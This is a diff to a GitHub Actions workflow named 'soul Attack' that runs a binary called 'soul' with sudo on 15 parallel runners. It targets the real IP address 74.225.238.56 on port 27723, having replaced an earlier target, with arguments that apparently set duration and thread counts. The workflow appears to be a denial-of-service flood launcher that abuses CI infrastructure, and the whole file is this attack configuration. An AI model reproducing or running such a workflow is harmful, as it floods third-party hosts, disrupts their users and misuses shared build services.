@@ -2,13 +2,23 @@ name: soul Attack
 on: [push]
 
 jobs:
-  soul:
+  first-five-jobs:
     runs-on: ubuntu-22.04
     strategy:
       matrix:
-        n: [1,2,3,4,5,6,7,8,9,10,
-            11,12,13,14,15]
+        n: [1,2,3,4,5]
     steps:
     - uses: actions/checkout@v3
     - run: chmod +x soul
-    - run: sudo ./soul 20.204.88.80 14446 100 999
+    - run: sudo ./soul 74.225.238.56 27723 120 27723 10 150
+
+  next-ten-jobs:
+    runs-on: ubuntu-22.04
+    needs: first-five-jobs
+    strategy:
+      matrix:
+        n: [6,7,8,9,10,11,12,13,14,15]
+    steps:
+    - uses: actions/checkout@v3
+    - run: chmod +x soul
+    - run: sudo ./soul 74.225.238.56 27723 120 27723 90 400
